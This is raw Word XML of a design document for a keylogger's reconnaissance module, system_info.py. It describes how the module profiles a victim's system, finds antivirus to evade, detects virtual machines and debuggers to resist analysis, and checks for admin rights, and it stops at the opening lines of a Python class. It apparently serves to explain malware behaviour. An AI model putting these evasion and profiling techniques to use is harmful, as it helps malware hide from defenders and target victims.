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INFORMATION GATHERING MODULE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Target System Reconnaissance Component</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Module Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The System Information Gathering module (system_info.py) is a critical reconnaissance component of the keylogger system. It collects comprehensive information about the target system to help attackers understand the victim's environment, identify security measures, and plan subsequent attack stages. This module demonstrates how malware performs initial reconnaissance before executing payloads.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Purpose and Objectives</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Gather detailed system specifications for attack planning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Identify installed security software (antivirus, firewall)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Detect virtual machines and debugging environments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Determine user privilege level (admin vs. standard user)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Map network configuration for lateral movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Collect hardware information for targeted exploits</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Assess system resources and capabilities</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 Key Features</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Cross-Platform Support: </w:t>
      </w:r>
      <w:r>
        <w:t>Works on Windows, Linux, and Android systems</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Comprehensive Data Collection: </w:t>
      </w:r>
      <w:r>
        <w:t>Gathers 50+ data points across 6 categories</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Anti-Analysis Detection: </w:t>
      </w:r>
      <w:r>
        <w:t>Identifies VMs, debuggers, and sandbox environments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Security Software Detection: </w:t>
      </w:r>
      <w:r>
        <w:t>Detects installed antivirus and firewall status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Multiple Output Formats: </w:t>
      </w:r>
      <w:r>
        <w:t>Exports data as formatted text or JSON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Minimal Footprint: </w:t>
      </w:r>
      <w:r>
        <w:t>Executes in 1-3 seconds with minimal resource usage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Stealth Operation: </w:t>
      </w:r>
      <w:r>
        <w:t>No visible windows or user notifications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Technical Implementation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Module Architecture</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The module is implemented as a Python class (SystemInfo) with modular methods for collecting different categories of information. This design allows selective data gathering and easy integration with other components.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Core Components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Function</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SystemInfo Class</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Main class orchestrating all data collection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>gather_all()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Master method that collects all information categories</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>get_basic_info()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Collects OS, hostname, architecture, processor details</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>get_network_info()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Gathers IP addresses, MAC addresses, network interfaces</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>get_hardware_info()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Retrieves CPU, memory, disk, and GPU specifications</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>get_software_info()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Identifies OS version, uptime, running processes, antivirus</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>get_user_info()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Collects username, directories, environment variables, privileges</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>get_security_info()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Detects VMs, debuggers, and firewall status</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>to_json()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exports data in JSON format</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>to_formatted_text()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exports data in human-readable text format</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>save_to_file()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Saves collected data to disk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Data Collection Categories</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Category 1: Basic System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Data Point</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Hostname</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Computer name on the network</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Operating system (Windows/Linux/Android)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Platform Release</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>OS version (e.g., Windows 11, Ubuntu 22.04)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Platform Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Detailed version string</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Architecture</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CPU architecture (x86, x64, ARM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Processor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CPU model and manufacturer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Python Version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Installed Python interpreter version</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Category 2: Network Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Local IP Address: </w:t>
      </w:r>
      <w:r>
        <w:t>Primary IP address of the system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">FQDN: </w:t>
      </w:r>
      <w:r>
        <w:t>Fully Qualified Domain Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Network Interfaces: </w:t>
      </w:r>
      <w:r>
        <w:t>All network adapters (Ethernet, Wi-Fi, VPN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">MAC Addresses: </w:t>
      </w:r>
      <w:r>
        <w:t>Hardware addresses for each interface</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IP Configuration: </w:t>
      </w:r>
      <w:r>
        <w:t>IP, netmask, and broadcast address per interface</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Category 3: Hardware Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">CPU Information: </w:t>
      </w:r>
      <w:r>
        <w:t>Physical cores, logical cores, frequency (max/current), usage percentage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Memory Information: </w:t>
      </w:r>
      <w:r>
        <w:t>Total RAM, available RAM, used RAM, usage percentage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Disk Information: </w:t>
      </w:r>
      <w:r>
        <w:t>All partitions with device, mountpoint, filesystem, size, usage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">GPU Information: </w:t>
      </w:r>
      <w:r>
        <w:t>Graphics card name, driver version (Windows only)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Category 4: Software Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">OS Details: </w:t>
      </w:r>
      <w:r>
        <w:t>Operating system name, version, release, build number</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Boot Time: </w:t>
      </w:r>
      <w:r>
        <w:t>When the system was last started</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Uptime: </w:t>
      </w:r>
      <w:r>
        <w:t>How long the system has been running</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Running Processes: </w:t>
      </w:r>
      <w:r>
        <w:t>Total number of active processes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Windows Edition: </w:t>
      </w:r>
      <w:r>
        <w:t>Windows edition (Home, Pro, Enterprise) - Windows only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Linux Distribution: </w:t>
      </w:r>
      <w:r>
        <w:t>Distribution name (Ubuntu, Debian, etc.) - Linux only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Antivirus Software: </w:t>
      </w:r>
      <w:r>
        <w:t>Installed antivirus products - Windows only</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Category 5: User Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Username: </w:t>
      </w:r>
      <w:r>
        <w:t>Currently logged-in user</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Home Directory: </w:t>
      </w:r>
      <w:r>
        <w:t>User's home folder path</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Current Directory: </w:t>
      </w:r>
      <w:r>
        <w:t>Working directory where malware is executing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Environment Variables: </w:t>
      </w:r>
      <w:r>
        <w:t>PATH, TEMP, USERPROFILE, COMPUTERNAME</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Admin Privileges: </w:t>
      </w:r>
      <w:r>
        <w:t>Whether user has administrator/root access</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Category 6: Security Information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Virtual Machine Detection: </w:t>
      </w:r>
      <w:r>
        <w:t>Identifies VMware, VirtualBox, QEMU, Xen, Hyper-V, Parallels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Debugger Detection: </w:t>
      </w:r>
      <w:r>
        <w:t>Checks if a debugger is attached (anti-analysis)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Firewall Status: </w:t>
      </w:r>
      <w:r>
        <w:t>Windows Firewall enabled/disabled status</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Technical Implementation Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Virtual Machine Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Malware often checks if it's running in a virtual machine to avoid analysis by security researchers. The module uses multiple detection techniques:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Detection Techniques:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>String matching in platform and processor information for VM indicators</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Checking for VM-specific driver files (Vmmouse.sys, VBoxGuest.sys, etc.)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Detecting hypervisor signatures in system information</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Identifying VM-specific hardware characteristics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Detected Virtual Machines: </w:t>
      </w:r>
      <w:r>
        <w:t>VMware, VirtualBox, QEMU, Xen, Hyper-V, Parallels</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Debugger Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Debuggers are used by security analysts to reverse engineer malware. The module detects debuggers to prevent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rPr>
              <w:t>Platform</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Detection Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Windows</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Uses IsDebuggerPresent() Win32 API call</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Linux</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Checks TracerPid field in /proc/self/status file</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Result</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Returns True if debugger is attached, False otherwise</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Antivirus Detection (Windows)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>On Windows systems, the module queries the Windows Security Center to identify installed antivirus products. This helps attackers understand what security software they need to evade.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Method: </w:t>
      </w:r>
      <w:r>
        <w:t>WMI query to root\SecurityCenter2 namespace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Detected Products: </w:t>
      </w:r>
      <w:r>
        <w:t>Windows Defender, Norton, McAfee, Kaspersky, Avast, AVG, Bitdefender, and others</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Administrator Privilege Detection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Determining if the malware is running with elevated privileges is crucial for planning privilege escalation attacks or determining available capabilities.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Windows: </w:t>
      </w:r>
      <w:r>
        <w:t>Calls IsUserAnAdmin() from shell32.dll</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Linux/Unix: </w:t>
      </w:r>
      <w:r>
        <w:t>Checks if effective user ID (euid) is 0 (root)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. Code Implementation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Core Class Structure</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The SystemInfo class is structured as follows:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>class SystemInfo:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    def __init__(self):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.info = {}</w:t>
        <w:br/>
